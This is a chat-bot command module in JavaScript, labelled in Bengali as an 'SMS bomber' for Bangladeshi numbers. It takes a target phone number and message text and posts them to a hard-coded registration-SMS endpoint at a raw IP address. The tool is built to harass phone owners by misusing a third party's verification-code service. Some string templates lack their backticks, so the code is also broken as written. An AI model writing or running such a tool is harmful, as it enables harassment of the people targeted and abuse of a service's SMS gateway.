module.exports.config = {
  name: "bombing",
  version: "1.0.0",
  hasPermssion: 2, //DONT CHANGE THIS MODIFIER CREDIT RAHAT-KHAN
  credits: "RAHAT KHAN",
  description: "এসএমএস বোম্বার, শুধুমাত্র বাংলাদেশি নাম্বারের জন্য প্রযোজ্য",
  commandCategory: "Tool",
  usages: ".sms number text",
  cooldowns: 5,
    dependencies: {}
};

module.exports.run = async function({ api, event, args }) {
    const { threadID } = event;
    const phoneNumber = args[0];
    const message = args.slice(1).join(" ");

    if (!phoneNumber || !message) {
        return api.sendMessage('Please provide a phone number and message.', threadID);
    }

    const url = 'http://202.51.182.198:8181/nbp/sms/code';

    const data = {
        receiver: phoneNumber,
        text: message,
        title: 'Register Account'
    };

    const headers = {
        'Content-Type': 'application/json'
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify(data)
        });

        const result = await response.json();
        api.sendMessage(Success: ${result}, threadID);
    } catch (error) {
        console.error('Error:', error);
        api.sendMessage(Error: ${error.message}, threadID);
    }
};
